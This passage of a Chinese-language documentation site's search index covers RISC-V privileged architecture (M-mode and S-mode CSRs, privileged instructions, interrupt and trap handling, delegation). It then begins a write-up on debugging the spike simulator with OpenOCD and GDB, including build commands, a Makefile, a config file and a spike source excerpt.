enable\uff0c\u7528\u4e8e\u4fdd\u5b58\u4e2d\u65ad\u662f\u5426\u53d1\u751f\u4ee5\u53ca\u662f\u5426\u5141\u8bb8\u4e2d\u65ad\u3002</p> <p>\u4e2d\u65ad i\uff08\u4e0a\u9762\u5b9a\u4e49\u7684\u4e2d\u65ad\u7801\uff09\u9677\u5165 M \u6a21\u5f0f\u5f53\u4ee5\u4e0b\u6761\u4ef6\u540c\u65f6\u6ee1\u8db3\u65f6\uff1a</p> <ul> <li>\u5f53\u524d\u7279\u6743\u6a21\u5f0f\u4e3a M \u6a21\u5f0f\uff0c\u4e14 mstatus[MIE] \u4e3a 1\uff0c\u6216\u5f53\u524d\u7279\u6743\u6a21\u5f0f\u4f4e\u4e8e M</li> <li>mip[i] \u4e3a 1\uff0c\u4e14 mie[i] \u4e3a 1</li> <li>\u5982\u679c\u5b58\u5728 mideleg \u5bc4\u5b58\u5668\uff0c\u5219\u9700\u8981 mideleg[i] \u4e3a 0\uff08\u4e0d\u59d4\u6258\uff09</li> </ul>"},{"location":"cs/pl/riscv/privileged/#mepc-mcause","title":"mepc &amp; mcause","text":"<p>mepc \u7528\u4e8e\u4fdd\u5b58 trap \u53d1\u751f\u65f6\u7684\u6307\u4ee4\u5730\u5740\u3002</p> <p>mcause \u7528\u4e8e\u4fdd\u5b58 trap \u53d1\u751f\u7684\u539f\u56e0\uff08\u4e0a\u9762\u89c4\u5b9a\uff09\uff1a</p> <ul> <li>31 / 63 Interrupt\uff1a\u4e3a 1 \u65f6\u8868\u793a\u662f\u4e2d\u65ad\uff0c\u4e3a 0 \u65f6\u8868\u793a\u662f\u5f02\u5e38</li> <li>[30:0] / [62:0] WLRL Code\uff1a\u4e2d\u65ad/\u5f02\u5e38\u7801\uff08\u4ee5\u503c\u7684\u65b9\u5f0f\u5b58\u50a8\uff0c\u800c\u4e0d\u662f\u5bf9\u5e94\u4f4d\uff09</li> </ul>"},{"location":"cs/pl/riscv/privileged/#mtval","title":"mtval","text":"<p>\u7528\u4e8e\u4fdd\u5b58 trap \u53d1\u751f\u65f6\u7684\u9644\u52a0\u4fe1\u606f\uff1a</p> <ul> <li>\u5982\u679c\u662f\u7531\u5b58\u50a8\u5668\u8bbf\u95ee\u5f15\u8d77\u7684\u5f02\u5e38\uff0c\u5219 mtval \u4fdd\u5b58\u7684\u662f\u8981\u8bbf\u95ee\u7684\u5730\u5740</li> <li>\u5982\u679c\u662f\u975e\u6cd5\u6307\u4ee4\u9020\u6210\u7684\u5f02\u5e38\uff0c\u5219\u5c06\u8be5\u6307\u4ee4\u7684\u7f16\u7801\u4fdd\u5b58\u5728 mtval \u4e2d</li> </ul>"},{"location":"cs/pl/riscv/privileged/#m","title":"M \u6a21\u5f0f\u5185\u5b58\u6620\u5c04\u5bc4\u5b58\u5668","text":"<p>RISC-V \u7279\u6743\u7ea7\u89c4\u8303\u89c4\u5b9a\u4e86\u4e24\u4e2a M \u6a21\u5f0f\u5185\u5b58\u6620\u5c04\u5bc4\u5b58\u5668\uff0c\u5206\u522b\u662f mtime \u548c mtimecmp\u3002</p> <p>mtime \u548c mtimecmp \u5728 RV32 \u548c RV64 \u4e2d\u90fd\u662f 64 \u4f4d\u7684\u3002mtime \u5e94\u8be5\u7531\u673a\u5668\u5b9e\u73b0\uff0c\u4ee5\u56fa\u5b9a\u9891\u7387\u9012\u589e\u3002\u5f53 mtime \u7684\u503c\u5927\u4e8e\u7b49\u4e8e mtimecmp \u65f6\uff0c\u8981\u89e6\u53d1 machine timer interrupt\uff08\u5f53 mie \u5bc4\u5b58\u5668\u4e2d\u7684 MTIE \u4f4d\u4e3a 1 \u65f6\uff09\u3002</p> <p>Note</p> <p>\u5728 qemu \u7684\u9ed8\u8ba4\u8bbe\u7f6e\u4e2d\uff0cmtime \u7684\u5730\u5740\u4f4d\u4e8e 0x200bff8\uff0cmtimecmp \u7684\u5730\u5740\u4f4d\u4e8e 0x2004000\u3002</p>"},{"location":"cs/pl/riscv/privileged/#m_1","title":"M \u6a21\u5f0f\u7279\u6743\u6307\u4ee4","text":"ecall I \u578b 31 20 19 15 14 12 11 7 6 0 000000000000 00000 000 00000 1110011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aecall</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1aM \u6a21\u5f0f\u8c03\u7528 ecall \u4f1a\u4ea7\u751f environment-call-from-M-mode \u5f02\u5e38</li> <li>\u6ce8\u610f\uff1a\u63a5\u6536\u7279\u6743\u7ea7\u7684 epc \u5bc4\u5b58\u5668\u8981\u8bbe\u7f6e\u4e3a ecall \u6307\u4ee4\u7684\u5730\u5740\uff0c\u800c\u4e0d\u662f ecall \u6307\u4ee4\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\uff0c\u4e14 ecall \u6307\u4ee4\u4e0d\u4f1a\u589e\u52a0 minstret \u5bc4\u5b58\u5668\u7684\u503c</li> </ul> ebreak I \u578b 31 20 19 15 14 12 11 7 6 0 000000000001 00000 000 00000 1110011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aebreak</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u4efb\u4f55\u6a21\u5f0f\u8c03\u7528 ebreak \u90fd\u4f1a\u4ea7\u751f breakpoint \u5f02\u5e38\uff0c\u5c06\u63a7\u5236\u6d41\u4ea4\u7ed9\u8c03\u8bd5\u5668</li> <li>\u6ce8\u610f\uff1a\u63a5\u6536\u7279\u6743\u7ea7\u7684 epc \u5bc4\u5b58\u5668\u8981\u8bbe\u7f6e\u4e3a ebreak \u6307\u4ee4\u7684\u5730\u5740\uff0c\u800c\u4e0d\u662f ebreak \u6307\u4ee4\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740\uff0c\u4e14 ebreak \u6307\u4ee4\u4e0d\u4f1a\u589e\u52a0 minstret \u5bc4\u5b58\u5668\u7684\u503c</li> </ul> mret I \u578b 31 20 19 15 14 12 11 7 6 0 001100000010 00000 000 00000 1110011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1amret</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5728 M \u6a21\u5f0f\u5904\u7406 trap \u4e4b\u540e\u8fd4\u56de\u524d\u4e00\u7279\u6743\u6a21\u5f0f\uff0c\u5e76\u5c06 pc \u8bbe\u7f6e\u4e3a mepc \u5bc4\u5b58\u5668\u7684\u503c<ul> <li>\u5c06\u5f53\u524d\u7279\u6743\u6a21\u5f0f\u8bbe\u7f6e\u4e3a mstatus[MPP]</li> <li>\u5c06 mstatus[MIE] \u8bbe\u7f6e\u4e3a mstatus[MPIE]</li> <li>\u5c06 mstatus[MPIE] \u8bbe\u7f6e\u4e3a 1</li> <li>\u5c06 mstatus[MPP] \u8bbe\u7f6e\u4e3a U</li> <li>\u5c06 pc \u8bbe\u7f6e\u4e3a mepc \u5bc4\u5b58\u5668\u7684\u503c</li> </ul> </li> </ul> wfi I \u578b 31 20 19 15 14 12 11 7 6 0 000100000101 00000 000 00000 1110011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1awfi</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u4efb\u4f55\u7279\u6743\u6a21\u5f0f\u5747\u53ef\u7528\uff0c\u6267\u884c\u65f6\u5f53\u524d hart \u4f1a\u8fdb\u5165\u4f11\u7720\uff0c\u7b49\u5f85\u4e2d\u65ad\u6765\u5524\u9192\uff0c\u76f8\u5f53\u4e8e nop</li> </ul>"},{"location":"cs/pl/riscv/privileged/#supervisor_1","title":"Supervisor \u6a21\u5f0f","text":""},{"location":"cs/pl/riscv/privileged/#s-csrs","title":"S \u6a21\u5f0f CSRs","text":""},{"location":"cs/pl/riscv/privileged/#sstatus","title":"sstatus","text":"<p>sstatus \u662f mstatus \u7684\u4e00\u4e2a\u5b50\u96c6\uff0c\u7528\u4e8e\u4fdd\u5b58 S \u6a21\u5f0f\u7684\u72b6\u6001\uff0c\u5176\u90e8\u5206\u4e2d\u65ad\u76f8\u5173\u7684\u7ed3\u6784\u5982\u4e0b\uff1a</p> <ul> <li>1 SIE\uff1aS \u6a21\u5f0f\u5168\u5c40\u4e2d\u65ad\u4f7f\u80fd</li> <li>5 SPIE\uff1a\u4fdd\u5b58\u7684\u524d\u4e00\u4e2a S \u6a21\u5f0f\u5168\u5c40\u4e2d\u65ad\u4f7f\u80fd</li> <li>8 WARL SPP\uff1aS \u6a21\u5f0f\u4e2d\u65ad\u5904\u7406\u524d\u7684\u7279\u6743\u7ea7\u522b</li> </ul>"},{"location":"cs/pl/riscv/privileged/#_3","title":"\u5176\u5b83","text":"<p>stvec\u3001sip\u3001sie\u3001sepc\u3001scause\u3001stval \u610f\u4e49\u5747\u4e0e M \u6a21\u5f0f\u7c7b\u4f3c\u3002</p>"},{"location":"cs/pl/riscv/privileged/#s","title":"S \u6a21\u5f0f\u7279\u6743\u6307\u4ee4","text":"ecall I \u578b 31 20 19 15 14 12 11 7 6 0 000000000000 00000 000 00000 1110011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aecall</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1aS \u6a21\u5f0f\u8c03\u7528 ecall \u4f1a\u4ea7\u751f environment-call-from-S-mode \u5f02\u5e38</li> <li>\u6ce8\u610f\uff1a\u63a5\u6536\u7279\u6743\u7ea7\u7684 epc \u5bc4\u5b58\u5668\u8981\u8bbe\u7f6e\u4e3a ecall \u6307\u4ee4\u7684\u5730\u5740\uff0c\u800c\u4e0d\u662f ecall \u6307\u4ee4\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740</li> </ul> ebreak I \u578b 31 20 19 15 14 12 11 7 6 0 000000000001 00000 000 00000 1110011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aebreak</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u4efb\u4f55\u6a21\u5f0f\u8c03\u7528 ebreak \u90fd\u4f1a\u4ea7\u751f breakpoint \u5f02\u5e38\uff0c\u5c06\u63a7\u5236\u6d41\u4ea4\u7ed9\u8c03\u8bd5\u5668</li> <li>\u6ce8\u610f\uff1a\u63a5\u6536\u7279\u6743\u7ea7\u7684 epc \u5bc4\u5b58\u5668\u8981\u8bbe\u7f6e\u4e3a ebreak \u6307\u4ee4\u7684\u5730\u5740\uff0c\u800c\u4e0d\u662f ebreak \u6307\u4ee4\u7684\u4e0b\u4e00\u6761\u6307\u4ee4\u7684\u5730\u5740</li> </ul> sret I \u578b 31 20 19 15 14 12 11 7 6 0 000100000010 00000 000 00000 1110011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1asret</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5728 S \u6a21\u5f0f\u5904\u7406 trap \u4e4b\u540e\u8fd4\u56de\u524d\u4e00\u7279\u6743\u6a21\u5f0f\uff0c\u5e76\u5c06 pc \u8bbe\u7f6e\u4e3a sepc \u5bc4\u5b58\u5668\u7684\u503c<ul> <li>\u5c06\u5f53\u524d\u7279\u6743\u6a21\u5f0f\u8bbe\u7f6e\u4e3a sstatus[SPP]</li> <li>\u5c06 sstatus[SIE] \u8bbe\u7f6e\u4e3a sstatus[SPIE]</li> <li>\u5c06 sstatus[SPIE] \u8bbe\u7f6e\u4e3a 1</li> <li>\u5c06 sstatus[SPP] \u8bbe\u7f6e\u4e3a U</li> <li>\u5c06 pc \u8bbe\u7f6e\u4e3a sepc \u5bc4\u5b58\u5668\u7684\u503c</li> </ul> </li> </ul> wfi I \u578b 31 20 19 15 14 12 11 7 6 0 000100000101 00000 000 00000 1110011 <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1awfi</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u4efb\u4f55\u7279\u6743\u6a21\u5f0f\u5747\u53ef\u7528\uff0c\u6267\u884c\u65f6\u5f53\u524d hart \u4f1a\u8fdb\u5165\u4f11\u7720\uff0c\u7b49\u5f85\u4e2d\u65ad\u6765\u5524\u9192\uff0c\u76f8\u5f53\u4e8e nop</li> </ul>"},{"location":"cs/pl/riscv/privileged/#risc-v","title":"RISC-V \u4e2d\u65ad\u548c\u5f02\u5e38\u5904\u7406","text":"<p>RISC-V \u5c06\u80fd\u5f15\u8d77\u5f53\u524d\u7a0b\u5e8f\u4e2d\u65ad\uff0c\u4f7f CPU \u8f6c\u5230\u7279\u5b9a\u4ee3\u7801\u7684\u4e8b\u4ef6\u79f0\u4e3a\u9677\u9631\uff08Trap\uff09\uff0c\u5176\u5206\u4e3a\u4e24\u7c7b\uff0c\u4e2d\u65ad\uff08Interrupt\uff09\u548c\u5f02\u5e38\uff08Exception\uff09\uff1a</p> <ul> <li>\u4e2d\u65ad\u662f\u786c\u4ef6\u4ea7\u751f\u7684\uff0c\u5f02\u6b65\u5904\u7406\uff0c\u662f\u6b63\u5e38\u4e8b\u4ef6\u3002\u5305\u62ec\u8f6f\u4ef6\u4e2d\u65ad\u3001\u65f6\u949f\u4e2d\u65ad\u3001\u5916\u90e8\u4e2d\u65ad\u7b49\u3002</li> <li>\u5f02\u5e38\u662f\u8f6f\u4ef6\u4ea7\u751f\u7684\uff0c\u540c\u6b65\u5904\u7406\uff0c\u662f\u975e\u6b63\u5e38\u4e8b\u4ef6\uff0c\u53ef\u80fd\u4f1a\u5bfc\u81f4\u7a0b\u5e8f\u7ec8\u6b62\u3002\u4f8b\u5982\u6307\u4ee4\u5f02\u5e38\u7b49\u3002</li> </ul>"},{"location":"cs/pl/riscv/privileged/#_4","title":"\u4e2d\u65ad\u5904\u7406","text":"<p>RISC-V \u4e2d\u5916\u90e8\u4e2d\u65ad\u5fc5\u987b\u901a\u8fc7 CSR \u6765\u5f00\u542f\uff0c\u5f00\u542f\u4e2d\u65ad\u7531\u4e24\u4e2a\u6b65\u9aa4\uff1a</p> <ul> <li>mstatus[MIE] \u662f\u5168\u5c40\u4e2d\u65ad\u4f7f\u80fd\u4f4d\uff0c\u8bbe\u7f6e\u4e3a 1 \u624d\u4f1a\u5168\u5c40\u5f00\u542f\u4e2d\u65ad</li> <li>mie \u5bc4\u5b58\u5668\u4e2d\u662f\u9488\u5bf9\u5404\u79cd\u4e2d\u65ad\u7c7b\u578b\u7684\u4f7f\u80fd\u4f4d\uff0c\u8981\u5c06\u9700\u8981\u7684\u4f4d\u8bbe\u7f6e\u4e3a 1</li> </ul> <p>\u4e2d\u65ad\u54cd\u5e94\u7a0b\u5e8f\u7684\u5165\u53e3\u5730\u5740\u7531 mtvec \u5bc4\u5b58\u5668\u6307\u5b9a\uff0c\u5982\u524d\u9762\u5199\u5230\u7684\uff0c\u5b83\u5206\u4e3a\u4e24\u79cd\u6a21\u5f0f\uff1a</p> <ul> <li>\u76f4\u63a5\u6a21\u5f0f\uff08Direct\uff09\uff0c\u6240\u6709 trap \u90fd\u8df3\u8f6c\u5230 mtvec \u5bc4\u5b58\u5668\u6307\u5b9a\u7684\u5730\u5740\u8fdb\u884c\u5904\u7406</li> <li>\u5411\u91cf\u5316\u6a21\u5f0f\uff08Vectored\uff09\uff0c\u4e2d\u65ad\u5c06\u6839\u636e\u4e2d\u65ad\u7c7b\u578b\u8df3\u8f6c\u5230\u4e0d\u540c\u504f\u79fb\u4f4d\u7f6e\u7684\u4e2d\u65ad\u54cd\u5e94\u7a0b\u5e8f\uff0c\u5f02\u5e38\u4ecd\u4f7f\u7528\u540c\u4e00\u4e2a\u54cd\u5e94\u7a0b\u5e8f</li> </ul> <p>\u5f53\u4e2d\u65ad\u53d1\u751f\u65f6\uff0cCPU \u4f1a\uff1a</p> <ul> <li>\u5c06\u53d1\u751f\u5f02\u5e38\u7684\u6307\u4ee4\uff08\u6216\u4e0b\u4e00\u6761\u6307\u4ee4\uff09\u7684\u5730\u5740\u4fdd\u5b58\u5230 mepc \u5bc4\u5b58\u5668</li> <li>\u5c06\u4e2d\u65ad\u7c7b\u578b\u7801\u4fdd\u5b58\u5230 mcause \u5bc4\u5b58\u5668</li> <li>\u5982\u679c\u4e2d\u65ad\u5e26\u6709\u9644\u52a0\u4fe1\u606f\uff0c\u5c06\u5176\u4fdd\u5b58\u5230 mtval \u5bc4\u5b58\u5668</li> <li>\u5982\u679c\u662f\u5916\u90e8\u5f15\u53d1\u7684\u4e2d\u65ad\uff0c\u4ee4 mstatus[MPIE] = mstatus[MIE]\uff08\u4fdd\u5b58\uff09\uff0c\u7136\u540e\u4ee4 mstatus[MIE] = 0\uff08\u5173\u95ed\u4e2d\u65ad\uff09</li> <li>\u5c06\u5f53\u524d\u7279\u6743\u6a21\u5f0f\u4fdd\u5b58\u5230 mstatus[MPP] \u4e2d</li> <li>\u5c06\u5f53\u524d\u7279\u6743\u6a21\u5f0f\u8bbe\u7f6e\u4e3a Machine \u6a21\u5f0f</li> <li>\u6839\u636e mtvec \u5bc4\u5b58\u5668\u7684\u8bbe\u7f6e\uff0c\u8df3\u8f6c\u5230\u5bf9\u5e94\u4e2d\u65ad\u54cd\u5e94\u7a0b\u5e8f</li> </ul> <p>\u4e2d\u65ad\u5904\u7406\u7ed3\u675f\u540e\u8981\u4f7f\u7528 mret \u6307\u4ee4\u8fdb\u884c\u8fd4\u56de\uff0c\u5b83\u4f1a\uff1a</p> <ul> <li>\u4ee4 mstatus[MIE] = mstatus[MPIE]\uff08\u6062\u590d\uff09\uff0c\u7136\u540e\u4ee4 mstatus[MPIE] = 1</li> <li>\u5c06\u5f53\u524d\u7279\u6743\u6a21\u5f0f\u8bbe\u7f6e\u4e3a mstatus[MPP] \u4e2d\u4fdd\u5b58\u7684\u503c</li> <li>\u5c06 mstatus[MPP] \u8bbe\u7f6e\u4e3a U \u6a21\u5f0f</li> <li>\u5c06 pc \u503c\u8bbe\u7f6e\u4e3a mepc \u503c\uff0c\u5373\u8df3\u8f6c\u56de\u4e2d\u65ad\u524d\u7684\u7a0b\u5e8f</li> </ul>"},{"location":"cs/pl/riscv/privileged/#_5","title":"\u59d4\u6258\u5904\u7406","text":"<p>RISC-V \u4e2d\uff0c\u6240\u6709\u4e2d\u65ad\u90fd\u4f1a\u5728 Machine \u6a21\u5f0f\u4e0b\u8fdb\u884c\u5904\u7406\u3002\u5728\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u4e2d\u65ad\u901a\u5e38\u662f\u8981\u4ea4\u7ed9\u5185\u6838\u6765\u5904\u7406\u7684\uff0c\u5185\u6838\u6001\u5bf9\u5e94\u7684\u4e5f\u5c31\u662f Supervisor \u6a21\u5f0f\u3002RISC-V \u4e2d\u63d0\u4f9b\u4e86\u59d4\u6258\u673a\u5236\uff0c\u53ef\u4ee5\u5c06\u4e2d\u65ad\u76f4\u63a5\u59d4\u6258\u7ed9 Supervisor \u6a21\u5f0f\u5904\u7406\uff0c\u800c\u4e0d\u7ecf\u8fc7 Machine \u6a21\u5f0f\u3002</p> <p>\u76f8\u5173\u7684\u59d4\u6258\u8bbe\u7f6e\u5728 medeleg \u548c mideleg \u4e24\u4e2a\u5bc4\u5b58\u5668\u4e2d\uff0c\u76f8\u5173\u610f\u4e49\u5728\u524d\u9762 Machine-Level CSR \u90e8\u5206\u5199\u8fc7\u4e86\u3002</p> <p>\u5728\u59d4\u6258\u60c5\u51b5\u4e0b\uff0c\u548c\u4e0a\u9762\u4e0d\u540c\u7684\u662f\u5c06\u4f1a\u4f7f\u7528 Supervisor-Level \u7684 CSR\uff0c\u5982 sepc\u3001scause\u3001stval \u7b49\uff0c\u800c\u4e14\u4e5f\u4f1a\u4f7f\u7528 sret \u8fdb\u884c\u4e2d\u65ad\u8fd4\u56de\u3002</p>"},{"location":"cs/pl/riscv/spike/","title":"spike \u5de5\u5177\u94fe\u7684\u8c03\u8bd5\u4e0e\u65f6\u949f\u4e2d\u65ad\u5b66\u4e60","text":"<p> \u7ea6 3213 \u4e2a\u5b57  158 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 13 \u5206\u949f</p> <p>Abstract</p> <p>\u60f3\u63a2\u7d22\u4e00\u4e0b\u5728 OS \u8bfe\u4e0a\u5199\u4e00\u4e2a\u6307\u5bfc\u6765\u8ba9\u540c\u5b66\u4eec\u53ef\u4ee5\u50cf\u7cfb\u7edf\u4e00\u6837\u9009\u62e9 spike \u6765\u8fdb\u884c RISC-V kernel \u8c03\u8bd5\u3002\u5f53\u65f6\u7cfb\u7edf\u4e09\u52a9\u6559\u7684\u65f6\u5019\u7528\u8fc7\uff0c\u4f46\u662f spike \u662f\u5b66\u957f\u6539\u8fc7\u7684 riscv-isa-cosim\uff08\u52a0\u4e86 CJ \u4e5f\u5c31\u662f difftest \u7684\u90e8\u5206\uff09\uff0c\u8fd9\u4e2a\u76ee\u524d\u5df2\u7ecf\u6709\u6bb5\u65f6\u95f4\u6ca1\u66f4\u65b0\u4e86\uff0c\u6240\u4ee5\u5728\u5c1d\u8bd5\u4f7f\u7528\u6700\u65b0\u7248\u672c OpenSBI\uff08\u542f\u7528 PIE \u7f16\u8bd1\uff09\u7684\u65f6\u5019\u65e0\u6cd5\u52a0\u8f7d ELF\uff08\u8fd8\u4e0d\u652f\u6301 PIE\uff09\uff0c\u4e8e\u662f\u5c31\u66f4\u6362\u6210\u4e86\u6700\u65b0\u7684 spike\uff0c\u7136\u540e\u5c31\u6709\u4e86\u4ee5\u4e0b\u7684\u8c03\u8bd5\u8fc7\u7a0b\u3002</p> <p>\u540c\u6b65\u53d1\u5e03\u5728 blog\uff1ahttps://blog.tonycrane.cc/p/9188d8c1.html</p> <p>\u672c\u6587\u4e2d\u51fa\u73b0\u6e90\u7801\u7684\u7248\u672c\uff1a</p> <ul> <li>opensbi: c4940a9517486413cd676fc8032bb55f9d4e2778</li> <li>riscv-isa-sim: 0cc5ecce053c6dfa44e4a865d2838fc8d7d771dc</li> </ul>"},{"location":"cs/pl/riscv/spike/#_1","title":"\u5173\u4e8e\u5de5\u5177\u94fe","text":"<p>Spike \u8fd9\u5957\u4e1c\u897f\u7684\u903b\u8f91\u5c31\u662f\uff0cspike \u81ea\u8eab\u662f\u4e00\u4e2a\u4e13\u6ce8\u4e8e RISC-V \u89c4\u8303\u7684\u6a21\u62df\u5668\uff0c\u800c\u4e14\u4e5f\u6a21\u62df\u4e86\u786c\u4ef6\u673a\u5236\uff0c\u5728\u8c03\u8bd5\u65f6\u9700\u8981\u901a\u8fc7 JTAG \u6765\u8c03\u8bd5\uff0c\u5e76\u4e14\u5f00\u4e86\u4e00\u4e2a remote bitbang \u7684\u7aef\u53e3\u7528\u6765\u6536\u53d1\u6307\u4ee4\u3002\u7136\u540e\u4f7f\u7528 OpenOCD \u6765\u8fde\u63a5\u8fd9\u4e2a rbb \u7aef\u53e3\u8fdb\u884c\u6307\u4ee4\u7684\u89e3\u6790\uff0c\u518d\u5f00\u4e00\u4e2a\u7aef\u53e3\u6765\u4f9b GDB \u8bfb\u53d6\u8fd9\u4e9b\u4fe1\u606f\u8fdb\u884c\u8c03\u8bd5\u3002</p> <p>Spike \u662f\u4ece repo \u4e2d\u5b89\u88c5\u7684\u6700\u65b0\u7248\uff1a</p> <pre><code>git clone https://github.com/riscv-software-src/riscv-isa-sim\ncd riscv-isa-sim\nsudo apt install device-tree-compiler libboost-regex-dev libboost-system-dev\nmkdir build\ncd build\n../configure\nmake -j$(nproc)\nsudo make install\n</code></pre> <p>OpenOCD \u662f\u76f4\u63a5 apt \u5b89\u88c5\u7684\uff0cOpenSBI \u4e5f\u662f repo \u4e2d\u7684\u6700\u65b0\u7248\uff1a</p> <pre><code>git clone https://github.com/riscv-software-src/opensbi\ncd opensbi\nmkdir build\nmake O=build CROSS_COMPILE=riscv64-linux-gnu- PLATFORM=generic\n# output: build/platform/generic/firmware/fw_jump.elf\n</code></pre> <p>\u7136\u540e\u4e00\u4e9b\u547d\u4ee4\uff1a</p> <pre><code>spike_run: all\n    @echo Launch the spike ......\n    @spike --kernel=arch/riscv/boot/Image $(SPIKE_CONFIG)/fw_jump.elf\n\nspike_debug: all\n    @echo Launch the spike for debug ......\n    @spike -H --rbb-port=9824 --kernel=arch/riscv/boot/Image $(SPIKE_CONFIG)/fw_jump.elf\n\nspike_bridge:\n    @echo Launch the OpenOCD ......\n    @openocd -f $(SPIKE_CONFIG)/spike.cfg\n</code></pre> <p>\u5176\u4e2d OpenOCD \u7684\u914d\u7f6e\u6587\u4ef6 <code>spike.cfg</code> \u5982\u4e0b\uff08\u6700\u5f00\u59cb\u7684\u7248\u672c\uff09\uff1a</p> <pre><code>adapter driver remote_bitbang\nremote_bitbang_host localhost\nremote_bitbang_port 9824\n\nset _CHIPNAME riscv\njtag newtap $_CHIPNAME cpu -irlen 5 \n\nset _TARGETNAME $_CHIPNAME.cpu\ntarget create $_TARGETNAME riscv -chain-position $_TARGETNAME\n\nbindto 0.0.0.0\ngdb_report_data_abort enable\n\ninit\nhalt\n</code></pre> <p><code>make spike_run</code> \u5c31\u662f\u76f4\u63a5\u8fd0\u884c kernel\uff0c<code>make spike_debug</code> \u5f00\u542f\u8c03\u8bd5\u6a21\u5f0f\uff0c\u518d\u53e6\u5f00\u4e00\u4e2a\u7ec8\u7aef\u8dd1 <code>make spike_bridge</code> \u542f\u52a8 OpenOCD \u7136\u540e\u5c31\u53ef\u4ee5\u7528 GDB \u8fde\u63a5\u4e86\u3002</p>"},{"location":"cs/pl/riscv/spike/#gdb-sigint","title":"GDB \u8c03\u8bd5\u65f6\u4e0d\u65ad\u9047\u5230 SIGINT","text":"<p>\u521a\u5f00\u59cb\u7684\u65f6\u5019 spike_run \u6ca1\u95ee\u9898\uff0c\u4f46\u662f\u4e00\u65e6\u8c03\u8bd5\u8d77\u6765\uff0c\u8fde\u63a5\u4e0a\u540e\u518d b _start\uff0c\u968f\u540e c \u7684\u8bdd\u5c31\u4f1a\u5728\u4e2d\u95f4\u591a\u6b21\u9047\u5230 SIGINT \u5bfc\u81f4\u8c03\u8bd5\u6682\u505c\uff0c\u5373\u4f7f <code>handle SIGINT nostop</code> \u7684\u8bdd\u4e5f\u4f1a\u770b\u5230\u8dd1\u5230 _start \u4e4b\u524d\u4e00\u76f4\u5728\u5ffd\u7565 SIGINT \u800c\u4e14\u6548\u7387\u6781\u4f4e\u3002</p> <p>\u8fd9\u4e2a\u95ee\u9898\u8c03\u7684\u5f88\u75db\u82e6\uff0c\u56e0\u4e3a\u5728\u540c\u4e00 OpenOCD \u548c\u914d\u7f6e\u4e0b\uff0c\u7528\u540c\u6837 OpenSBI\uff0c\u4f7f\u7528\u6700\u65b0 spike \u548c\u8001\u7684 cosim \u7684\u7ed3\u679c\u4e0d\u4e00\u6837\uff08cosim \u4e0d\u4f1a SIGINT\uff09\uff0c\u6240\u4ee5\u95ee\u9898\u5c31\u88ab\u9501\u5b9a\u5728 spike \u8eab\u4e0a\u4e86\u3002</p> <p>\u8d77\u521d\u6211\u8ba4\u4e3a\u662f spike \u6dfb\u52a0\u4e86 debug triggers \u7684\u95ee\u9898\uff0c\u56e0\u4e3a\u6211\u662f\u5934\u4e00\u6b21\u5728 OpenSBI \u7684\u8f93\u51fa\u4e2d\u770b\u5230 sdtrig \u6307\u4ee4\u96c6\u6269\u5c55\uff0c\u7136\u540e\u770b\u5230\u4e86 4 triggers\uff0c\u4f46\u662f\u867d\u7136\u6709 <code>--trigger</code> \u53c2\u6570\u6765\u6307\u5b9a\u6570\u91cf\uff0c\u4e5f\u4e0d\u80fd\u4f7f\u5b83\u5c0f\u4e8e 1\u3002\u540c\u65f6\u5373\u4f7f\u8bbe\u5b9a\u4e86 <code>--isa=RV64gc</code> \u4e0d\u5e26\u4efb\u4f55\u6269\u5c55\uff0c\u4e5f\u4f1a\u81ea\u52a8\u52a0\u4e0a sdtrig\u3002\u5f53\u65f6\u51e0\u4e4e\u5c31\u8ba4\u5b9a\u662f trigger \u7684\u95ee\u9898\u4e86\uff0c\u4f46\u662f\u540e\u6765\u5728 riscv/processor.cc \u4e2d\u53d1\u73b0\u4e86\u51fd\u6570 <code>processor_t::take_trigger_action</code>\uff0c\u5728\u8fd9\u4e2a\u5f00\u5934\u628a\u8f93\u51fa\u7684 trigger \u4fe1\u606f\u786c\u6027\u8981\u6c42\u8f93\u51fa\u5230 stdout \u4e2d\uff0c\u53d1\u73b0\u5e76\u6ca1\u6709\u8f93\u51fa\uff1a</p> (spike) riscv/processor.cc<pre><code>void processor_t::take_trigger_action(triggers::action_t action, reg_t breakpoint_tval, reg_t epc, bool virt)\n{\n  if (debug) {\n    std::stringstream s; // first put everything in a string, later send it to output\n    s &lt;&lt; \"core \" &lt;&lt; std::dec &lt;&lt; std::setfill(' ') &lt;&lt; std::setw(3) &lt;&lt; id\n      &lt;&lt; \": trigger action \" &lt;&lt; (int)action &lt;&lt; std::endl;\n    debug_output_log(&amp;s);\n  }\n</code></pre> <p>\u800c\u4e14\u540c\u6837\u6211\u5728 <code>processor_t::take_trap</code> \u5f00\u5934\u628a\u8f93\u51fa\u4e5f\u5f3a\u5236\u6253\u5f00\u4e86\uff0c\u4e5f\u53ea\u80fd\u53d1\u73b0\u5728 0x80000000 \u4e4b\u540e\uff08\u5c4f\u853d\u4e86\u8fd9\u524d\u9762\u7684\u90e8\u5206\uff0c\u56e0\u4e3a 0x1000 \u524d\u4f1a\u6709 debug rom \u4e00\u76f4\u5728\u8fd0\u884c\u4e00\u76f4\u5728 trap\uff09\u53ea\u51fa\u73b0\u8fc7\u4e00\u4e2a store access fault \u7684 trap\u3002\u6240\u4ee5\u90a3\u5c31\u80fd\u6392\u9664\u6389 trigger \u7684\u95ee\u9898\u4e86\u3002</p> <p>\u63a5\u7740\u6211\u4ece\u6e90\u7801\u5b89\u88c5\u4e86 